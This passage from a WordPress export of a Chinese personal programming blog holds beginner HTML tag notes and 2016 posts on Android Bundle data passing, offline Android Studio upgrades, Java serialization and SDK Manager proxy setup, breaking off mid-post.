    &lt;head&gt;
         &lt;title&gt;esx&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;b&gt;横看成岭侧成峰&lt;/b&gt;
        &lt;p&gt;&lt;font color=red&gt;远近高低各不同&lt;/font&gt;&lt;/p&gt;
        &lt;p&gt;&lt;font size=7&gt;不识庐山真面目&lt;/font&gt;&lt;/p&gt;
        &lt;p&gt;&lt;font size=5&gt;&lt;b&gt;只缘身在此山中&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;
        &lt;p&gt;&lt;b&gt;苏轼&lt;/b&gt;&lt;/p&gt;
    &lt;/body&gt;
&lt;/html&gt;</pre>

&nbsp;
<strong><span style="font-size: 18pt;">html符号实体</span></strong>
<strong>例子： &amp;copy; (&amp;地址符)，记得加上 ; 。</strong>
&nbsp;
<strong><span style="font-size: 18pt;">Html超链接</span></strong>
基本语法：
<strong>&lt;a href="URL" [属性]="[属性值]"&gt;……&lt;/a&gt;</strong>

<pre>例子：
&lt;a href="(其他网页)"&gt;esx&lt;/a&gt;
&lt;a href="x.html"&gt;esx&lt;/a&gt;
&lt;a href="http://www.baidu.com"&gt;esx&lt;/a&gt;</pre>

写邮件基本语法：&lt;a href="mailto:邮箱地址"&gt;esx&lt;/a&gt;
<strong>&lt;a href="mailto:1138099359@qq.com"&gt;esx&lt;/a&gt;</strong>
开启新窗口：（[属性]="[属性值]" == target="_blank"）
<strong>&lt;a href="x.html(其他类型网页) target="_blank"&gt;esx&lt;/a&gt;</strong>
在本页面打开：（[属性]="[属性值]" == target="_self"）
<strong>&lt;a href="x.html(其他类型网页) target="_self"&gt;esx&lt;/a&gt;</strong>
&nbsp;
<strong><span style="font-size: 18pt;">Html图片标记</span></strong>
src属性基本语法：
<strong>&lt;img src="图片路径 or 外部图片连接" [属性="属性值"]&gt; &lt;/img&gt;</strong>
例子：<strong>&lt;img src="x.jpg" width="Xpx" height="Ypx"&gt; &lt;/img&gt;</strong>
P.S:假如设定宽度高度比原图片小，不会导致图片变形，会自动按比例缩小。
所以可以直接：&lt;img src="x.jpg" width="*px" or （height="*px"）&gt;，只定义其中一个。
alt属性基本语法：<strong>&lt;a src="x.jpg "alt="内容"&gt;</strong>
含义：在图片未载入完毕时，在图片位置显示文字。
border属性基本语法：<strong>&lt;a src="x.jpg" border="属性值"&gt;</strong>（属性值决定粗细）
含义：在图片四周加上边框。
&nbsp;
<strong><span style="font-size: 18pt;">Html表格标记</span></strong>
Table基本语法：
<strong>&lt;table [属性="属性值"]&gt; &lt;tr [属性="属性值"]&gt; &lt;td [属性="属性值"]&gt;&lt; /td&gt; &lt;/tr&gt; &lt;/table&gt;</strong>
元素：
<strong>&lt;table&gt;:表格标记</strong>
<strong>&lt;tr&gt;&lt;/tr&gt;:行 P.S:在行加上align="center",使行的文字全部居中。</strong>
<strong>&lt;td&gt;&lt;/td&gt;:列 P.S:在列加上align="center",使列上的文字全部居中。</strong>
属性：
<strong>cellspacing="*px" or "属性值" 表格内边框大小</strong>
<strong>cellpadding="*px" or "属性值" 表格填充大小</strong>
合并行：
<strong>&lt;td colspan=行数&gt;</strong>
合并列：
<strong>&lt;th rowspan=行数&gt;</strong>

<pre>例子：
&lt;html&gt;
&lt;head&gt;&lt;title&gt;esx&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;table width="400px" border="2" cellspacing="0" bordercolor="#FF79BC" align="center" &gt;
&lt;tr&gt;&lt;td colspan=3 align="center"&gt;&lt;b&gt;星期一菜谱&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td rowspan=2&gt;&lt;b&gt;素菜&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;青草茄子&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;花椒扁豆&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;b&gt;小葱豆腐&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;炒白菜&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td rowspan=2&gt;&lt;b&gt;荤菜&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;油焖大虾&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;海参鱼翅&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;b&gt;红烧肉&lt;/b&gt;&lt;img src="C:\Users\Administrator\Pictures\gc_character_inori_2.png"/&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;烤全羊&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>

&nbsp;
<strong><span style="font-size: 18pt;">Html无序列表和有序列表</span></strong>
无序
基本语法：&lt;ul type="属性值"&gt;
&lt;li [属性="属性值"]&gt;列表内容&lt;/li&gt;
&lt;/ul&gt;
属性值有三种：
disc：实心圆
Circle：空心圆
Square：空心正方形
例子：
&lt;html&gt;
&lt;head&gt;&lt;title&gt;esx&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;ul type="disc"&gt;
&lt;li&gt;123&lt;/li&gt; or &lt;li&gt;123
&lt;li&gt;234&lt;/li&gt; or &lt;li&gt;234
&lt;/ul&gt;
&lt;/body&gt;
&lt;/html&gt;
有序
基本语法：&lt;ol type="属性值" start=“起始值“&gt;
&lt;li [属性="属性值"]&gt;列表内容&lt;/li&gt;
&lt;/ol&gt;
P.S:起始值默认为1，可以取阿拉伯数字、大小写字母（a/A）、大小写罗马字母（i/I）。
Html标记（元素）—列表之frameset/frame（框架）
基本语法
&lt;frameset
1、frameborder=“边框大小”
2、cols="第一个窗口百分比，（隔开）第二个窗口百分比"行分割
3、rows="第一个窗口百分比，（隔开）第二个窗口百分比"列分割
>
属性：
&lt;frame name="给frame取名" src="html路径" noresize等&gt; &lt;/frame&gt;
Or &lt;frame name="给frame取名" src="html路径" noresize（不允许在页面改变大小）等 /&gt;
&lt;/frameset&gt;
P.S：另一种写法 cols="50%,<em>(剩下的都给第二个窗口)"
P.S:此元素的意思就是把x1.html和x2.html放进x3.html中，x3.html不能使用&lt;body&gt;&lt;/body&gt;.
例子：
&lt;html&gt;
&lt;frameset cols="50%,</em>"&gt;
&lt;frame src="x1.html" /&gt;
&lt;frame src="x2.html" /&gt;
&lt;/html&gt;
(没有&lt;body&gt;和&lt;/body&gt;)
Html常用标记（元素）表单元素——form
基本属性语法：&lt;form action="URL" method=*(提交方法，默认get&lt;后来补上&gt;)&gt;
……[各种元素：输入框，文本域，密码框等]
……
&lt;input type="submit"&gt;&lt;input type=reset&gt;
&lt;/from&gt;
P.S: *部分可以为get（会在地址栏显示帐号密码），也可以是post（不会在地址栏显示帐号密码）。
*=text（文本）/password（密码）
1、checkbox(复选框&lt;input type="checkbox" name=水果&gt;苹果)
2、radio（单选框&lt;input type="radio" name=水果&gt;苹果 p.s:name名字必须一样，不然不能单选）
3、image（图片&lt;input type="image" src=".jpg"&gt;）
4、hidden（隐藏:即可提交数据，同时不影响界面，而且不占界面）
5、submit（提交）/reset（重新填写）
6、file（选择文件）
7、action：指定把请求交给那个页面
含义：表单元素，主要用于让用户输入数据，并提交给服务器。
例子：
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;登陆页面&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;font style="font-size:50px"&gt;登陆系统&lt;/font&gt;
&lt;form action="???" method="get"&gt;
用户名：&lt;input type="text" value="可以达到显示字效果，一般不需要" name="esx"&gt;&lt;br/&gt;
密码：&lt;input type="password" value="可以达到显示字效果，一般不需要" name="esx1"&gt;&lt;br/&gt;
&lt;input type="submit" value="登陆"&gt;
&lt;input type="reset" value="重新"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
Html常用标记（元素）——select [option/textarea..]
基本语法：
Select:
&lt;select name="下拉框"&gt;&lt;/select&gt;
option：
&lt;select name="like"&gt;
&lt;option [value="值"]&gt;名字&lt;/option&gt;
&lt;/select&gt;
P.S:
&lt;option [value="值"]&gt;是提交给服务器的值。
Textarea（文本域）：
&lt;textarea [cols="列数" rows="行数"]&gt;默认字&lt;/textarea&gt;
Html加强
语言字符集的信息
&lt;meta http-equiv="content-type" content="[text][css]等/[html][xml]等;charset=#[gdk][uft-8]等"
背景和文字颜色
&lt;body bgcolor=#（背景色彩） text=#（非连接文字色彩） link=#（可连接文字色彩） alink=#（正被点击的可连接色彩） vlink=#（已被点击的可连接色彩）&gt;
页面空白
&lt;body leftmargin=#px&gt;(离左边距离)&lt;body topmargin=#px&gt;(离顶部距离)
打开一个新的浏览器窗口
&lt;a href="#" target=_[blank(新窗口)] [_self(本窗口)] [_parent(本窗口)] [_top(父窗口)] [指向 frame的名字]&gt;
标尺线
&lt;hr/ [size=#][width=#][align=#][color="#"]&gt;
标题
&lt;h1~6&gt;&lt;/h1~6&gt;
字体大小
&lt;font size=1~7&gt;
物理字体
&lt;b&gt;&lt;/b&gt;加粗
&lt;i&gt;&lt;/i&gt;斜体
&lt;u&gt;&lt;/u&gt;下划线
&lt;tt&gt;&lt;/tt&gt;字体偏中
&lt;sup&gt;&lt;/sup&gt;字体偏上
&lt;sub&gt;&lt;/sub&gt;字体偏下
&lt;s&gt;&lt;/s&gt;字体加删除线
&lt;strike&gt;&lt;/strike&gt;和上面效果一样
客户端字体
&lt;font face="#(设定字体)"&gt;
默认选中
&lt;input type="checkbox" name="v" checked/(默认选中)&gt;
&lt;select name=#&gt;
&lt;option selected(默认选中)&gt;
&lt;option&gt;
&lt;/select&gt;
展现个数
&lt;select size="2"（显示个数）&gt;
多选
&lt;select size="2" multiple(多选)&gt;
label 元素不会向用户呈现任何特殊效果。不过，它为鼠标用户改进了可用性。如果您在 label 元素内点击文本，就会触发此控件。就是说，当用户选择该标签时，浏览器就会自动将焦点转到和标签相关的表单控件上。
&lt;from&gt;
&lt;label for="male"&gt;Male&lt;/label&gt;
&lt;input id="male" name="123" type="checkbox"&gt;&lt;/input&gt;
&lt;/from&gt;
&nbsp;
<strong>此笔记年代久远，日后再行排版...</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>890</wp:post_id>
		<wp:post_date><![CDATA[2016-02-12 21:17:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-12 13:17:41]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[30%e5%88%86%e9%92%9f%e4%b8%8a%e6%89%8bhtml]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="a"><![CDATA[a]]></category>
		<category domain="post_tag" nicename="html"><![CDATA[html]]></category>
		<category domain="post_tag" nicename="img"><![CDATA[img]]></category>
		<category domain="post_tag" nicename="select"><![CDATA[select]]></category>
		<category domain="post_tag" nicename="table"><![CDATA[table]]></category>
		<category domain="post_tag" nicename="%e5%85%83%e7%b4%a0"><![CDATA[元素]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%a0%87%e8%ae%b0"><![CDATA[标记]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[182]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Android中使用Bundle传递数据包</title>
		<link>https://www.nervgeek.com/2016/02/13/android%e4%b8%ad%e4%bd%bf%e7%94%a8bundle%e4%bc%a0%e9%80%92%e6%95%b0%e6%8d%ae%e5%8c%85/</link>
		<pubDate>Sat, 13 Feb 2016 08:44:52 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=899</guid>
		<description></description>
		<content:encoded><![CDATA[在不同的Activity中传递参数除了可以使用Intent以外，还可以使用Bundle来传递。相比起Intent，使用Bundle提高了复用性，相同的参数不需要多次填写，打包在Bundle即可。
MainActivity加一个按钮，跳转到另一个Activity。
在MainActivity的onCreate中添加：

<pre>findViewById(R.id.SendIntent2AnthorActivity).setOnClickListener(new View.OnClickListener() {
    public void onClick(View v) {
        Intent i = new Intent(MainActivity.this,GetIntentAndReturnIntentActivity.class);
        Bundle b = new Bundle();
        b.putString("Name", "Mr9esx");
        b.putInt("Age", 20);
        b.putString("WebSite", "Http://www.nervgeek.com");
        b.putString("Welcome","Welcome to Mr9esx's App!");
        i.putExtras(b);
        /*i.putExtra("data",b);*/
        /*也可以使用putExtra传递Bundle*/
        startActivity(i);
    }
});</pre>

<!--more-->
在新的Activity中接收Bundle包：

<pre>private TextView ShowValue;
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_get_intent_and_return_intent);
    ShowValue = (TextView)findViewById(R.id.AnthorActivityValue);
    Intent i = getIntent();
    Bundle data = i.getExtras();
    /*Bundle data = i.getBundleExtra("data");*/
    /*假如MainActivity使用putExtra的话就用上面的方法获取Bundle*/
    ShowValue.setText(String.format("My Name=%s\nAge=%d\nMy WebSite=%s\n%s",data.getString("Name"),data.getInt("Age"),data.getString("WebSite"),data.getString("Welcome","Welcome to My App!")));
    /*getString还能重载，假如没有Welcome的数据，则使用默认值“Welcome to My App!”*/
    /*String.format里能使用/n等转义字符*/
}</pre>

&nbsp;
最终页面：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/WFYXQUHOK949GH2FOV7H.png" rel="attachment wp-att-900"><img class="alignnone wp-image-900" src="https://www.nervgeek.com/wp-content/uploads/2016/02/WFYXQUHOK949GH2FOV7H.png" alt="WFYXQUHOK949G~H2F~O]V7H" width="429" height="769" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>899</wp:post_id>
		<wp:post_date><![CDATA[2016-02-13 16:44:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-13 08:44:52]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android%e4%b8%ad%e4%bd%bf%e7%94%a8bundle%e4%bc%a0%e9%80%92%e6%95%b0%e6%8d%ae%e5%8c%85]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="post_tag" nicename="bundle"><![CDATA[bundle]]></category>
		<category domain="post_tag" nicename="intent"><![CDATA[intent]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[251]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Android Studio 离线升级教程</title>
		<link>https://www.nervgeek.com/2016/02/13/android-studio-%e7%a6%bb%e7%ba%bf%e5%8d%87%e7%ba%a7%e6%95%99%e7%a8%8b/</link>
		<pubDate>Sat, 13 Feb 2016 15:52:20 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=903</guid>
		<description></description>
		<content:encoded><![CDATA[Android Studio 2.0已经出到Perview 9了，对于喜欢尝鲜的我立马就考虑升级了。但由于国内GTW的原因，自带的升级往往不能使用，所以还是非常推荐离线升级这个方法。
&nbsp;
想离线升级首先准备好以下两样东西：
一：打开<strong>Help -&gt; About</strong>，查看当前版本号，例如我现在是141.2456560，也就是Android Studio 2.0 Beta 4。
二：打开<a href="https://dl.google.com/android/studio/patches/updates.xml">https://dl.google.com/android/studio/patches/updates.xml</a>，查找最新版本，目前是143.2602393。

<pre>小知识：
·Stable Channel ： 正式版本通道，只会获取最新的正式版本。
·Beta Channel ： 测试版本通道，只会获取最新的测试版本。
·Dev Channel ： 开发发布通道，只会获取最新的开发版本。
·Canary Channel ： 预览发布通道，只会获取最新的预览版本。
 以上4个通道中， Stable Channel 最稳定，问题相对较少， Canary Channel 能获得最新版本，问题相对较多。</pre>

<!--more-->
把当前版本号和最新版本号记下来，生成这个下载链接：
<code>http://dl.google.com/android/studio/patches/AI-<strong>141.2456560</strong>-<strong>143.2602393</strong>-patch-win.jar</code>
你是什么版本，需要升级到什么版本，可以自己替换掉上面的版本，然后在迅雷或浏览器中下载。
&nbsp;
然后把<strong>AI-141.2456560-143.2602393-patch-win.jar</strong>放在<strong>除了Android Studio安装文件夹</strong>的地方，例如我放在C盘。
在C盘目录下打开CMD命令行（在C盘按着Shift点击右键 -&gt; 在此处打开命令窗口），输入：
<code>java -classpath AI-141.2456560-143.2602393-patch-win.jar com.intellij.updater.Runner install E:\Android\Android Studio</code>
我的Android Studio安装在E:\Android\Android Studio。
&nbsp;
静待数分钟，安装成功后再打开Android Studio，打开<strong>Help -&gt; About</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/A@9EDCT_OQ22LG@VKSG.png" rel="attachment wp-att-904"><img class="alignnone size-full wp-image-904" src="https://www.nervgeek.com/wp-content/uploads/2016/02/A@9EDCT_OQ22LG@VKSG.png" alt="A@9E]DCT_OQ22[LG@)&#96;VKSG" width="500" height="375" /></a>
安装成功！
&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>903</wp:post_id>
		<wp:post_date><![CDATA[2016-02-13 23:52:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-13 15:52:20]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android-studio-%e7%a6%bb%e7%ba%bf%e5%8d%87%e7%ba%a7%e6%95%99%e7%a8%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="post_tag" nicename="android-studio"><![CDATA[android studio]]></category>
		<category domain="post_tag" nicename="%e5%8d%87%e7%ba%a7"><![CDATA[升级]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="post_tag" nicename="%e6%95%99%e7%a8%8b"><![CDATA[教程]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_7a1da6a13e322b2cc9a3ae231943edb4]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_5a1c251368f037e6ea01393df75caedb]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[374]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中序列化Serializable的作用</title>
		<link>https://www.nervgeek.com/2016/02/15/java%e4%b8%ad%e5%ba%8f%e5%88%97%e5%8c%96serializable%e7%9a%84%e4%bd%9c%e7%94%a8/</link>
		<pubDate>Mon, 15 Feb 2016 13:59:30 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=908</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 18pt;">序列化是什么：</span></strong>
序列化就是将一个对象的状态（各个属性量）保存起来，然后在适当的时候再获得。
序列化分为两大部分：<strong>序列化</strong>和<strong>反序列化</strong>。
序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。
反序列化就是<strong>打开字节流并重构对象</strong>。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。
&nbsp;
<strong><span style="font-size: 18pt;">序列化的什么特点</span>：</strong>
如果某个类能够被序列化，其子类也可以被序列化。声明为<strong>static</strong>和<strong>transient</strong>类型的成员数据不能被序列化。因为static代表类的状态， transient代表对象的临时数据。
<!--more-->
<strong>代码示例：</strong>
在工程中新建一个java文件名为User：

<pre>public class User implements Serializable{
//只需要添加Serializable接口
    private String Name;
    private int Age;
    public User(String Name,int Age){
        this.Name = Name;
        this.Age = Age;
    }
    public int getAge() {
        return Age;
    }
    public String getName() {
        return Name;
   }
    public void setAge(int age) {
        Age = age;
    }
    public void setName(String name) {
        Name = name;
    }
}</pre>

&nbsp;
&nbsp;
在MainActivity中，把对象放进Intent中传给另一个Activity：

<pre>i.putExtra("user", new User("Mr9esx",20));
//一个名为user的User对象。</pre>

&nbsp;
在另一个Activity中使用<code>getSerializableExtra</code>提取出来，然后显示出来：

<pre>User user = (User)i.getSerializableExtra("user");
ShowValue.setText(String.format("%s,%d",user.getName(),user.getAge()));</pre>

&nbsp;
<strong>如果您还不是非常了解Serializable的话，可以尝试执行以下代码：</strong>
<span style="font-size: 12pt;">TestObjSerializeAndDeserialize.java</span>

<pre>import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.text.MessageFormat;
public class TestObjSerializeAndDeserialize {
    public static void main(String[] args) throws Exception {
        SerializePerson();
        Person p = DeserializePerson();
        System.out.println(MessageFormat.format("name={0},age={1},sex={2}",p.getName(), p.getAge(), p.getSex()));
    }
    private static void SerializePerson() throws FileNotFoundException,IOException {
        Person person = new Person();
        person.setName("gacl");
        person.setAge(25);
        person.setSex("boy");
        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File("E:/Person.txt")));
        oo.writeObject(person);
        System.out.println("scc");
        oo.close();
    }
    
    private static Person DeserializePerson() throws Exception, IOException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(
        new File("E:/Person.txt")));
        Person person = (Person) ois.readObject();
        System.out.println("scc");
        return person;
    }
}</pre>

&nbsp;
<span style="font-size: 12pt;">Person.java</span>

<pre>import java.io.Serializable;
public class Person implements Serializable {
    private static final long serialVersionUID = -5809782578272943999L;
    private int age;
    private String name;
    
    private String sex;public int getAge() {
        return age;
    }
    
    public String getName() {
        return name;
    }
    public String getSex() {
        return sex;
    }
    public void setAge(int age) {
        this.age = age;
    }
    public void setName(String name) {
        this.name = name;
    }
    public void setSex(String sex) {
        this.sex = sex;
    }
}</pre>

执行之后会在E盘下生成一个Person.txt，内容如下：

<pre> sr Person痏亞仙纴 I ageL namet Ljava/lang/String;L sexq ~ xp   t gaclt boy</pre>

程序中的<code>DeserializePerson</code>就是反序列化，把Person.txt读取出来重新构造对象。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>908</wp:post_id>
		<wp:post_date><![CDATA[2016-02-15 21:59:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-15 13:59:30]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e5%ba%8f%e5%88%97%e5%8c%96serializable%e7%9a%84%e4%bd%9c%e7%94%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="serializable"><![CDATA[serializable]]></category>
		<category domain="post_tag" nicename="%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96"><![CDATA[反序列化]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="post_tag" nicename="%e5%ba%8f%e5%88%97%e5%8c%96"><![CDATA[序列化]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[223]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Android SDK Manager国内无法下载更新解决办法</title>
		<link>https://www.nervgeek.com/2016/02/18/android-sdk-manager%e5%9b%bd%e5%86%85%e6%97%a0%e6%b3%95%e4%b8%8b%e8%bd%bd%e6%9b%b4%e6%96%b0%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95/</link>
		<pubDate>Thu, 18 Feb 2016 05:22:40 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=914</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/G44W3@Y3A6S454KWX.png" rel="attachment wp-att-915"><img class="alignnone size-full wp-image-915" src="https://www.nervgeek.com/wp-content/uploads/2016/02/G44W3@Y3A6S454KWX.png" alt="G&#96;4%4W]3@Y3A6S4{5[4K$WX" width="684" height="106" /></a>
点击 <strong>Tools</strong> -&gt; <strong>Options </strong>，在HTTP Proxy Server和HTTP Proxy Port填写下面服务器信息。<strong>
</strong>
<strong>Android SDK 在线更新镜像服务器资源：</strong>
